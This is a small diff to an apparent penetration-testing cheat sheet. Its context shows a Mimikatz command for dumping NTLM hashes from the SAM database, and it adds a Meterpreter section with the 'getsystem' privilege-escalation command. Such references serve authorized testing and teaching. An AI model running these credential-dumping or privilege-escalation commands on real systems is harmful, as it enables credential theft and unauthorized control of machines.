@@ -52,3 +52,7 @@ Dump only NTLM hashes from SAM database:
 ```
 lsadump::sam
 ```
+# Meterpreter
+```
+getsystem
+```
